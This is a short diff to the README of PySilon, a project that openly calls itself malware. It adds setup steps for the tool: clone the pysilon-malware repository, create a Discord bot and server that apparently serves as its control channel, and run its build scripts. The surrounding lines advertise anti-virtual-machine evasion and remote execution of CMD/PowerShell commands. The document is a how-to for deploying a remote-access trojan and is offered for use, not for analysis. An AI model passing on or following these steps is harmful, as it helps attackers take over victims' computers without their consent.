@@ -39,3 +39,10 @@
 - Anti-VM (PySilon won't run on Virtual Machines, f.ex.: VirtualBox, VMWare)
 - run shell commands (CMD/Powershell)
 - Debug Mode for easier testing and contribution
+### Preparation
+git clone https://github.com/mategol/pysilon-malware
+cd pysilon-malware
+Create Discord BOT and server
+Windows: Run the PySilon.bat either from Command Line or double clicking on it
+Linux: Run the PySilon.sh from Command Line
+
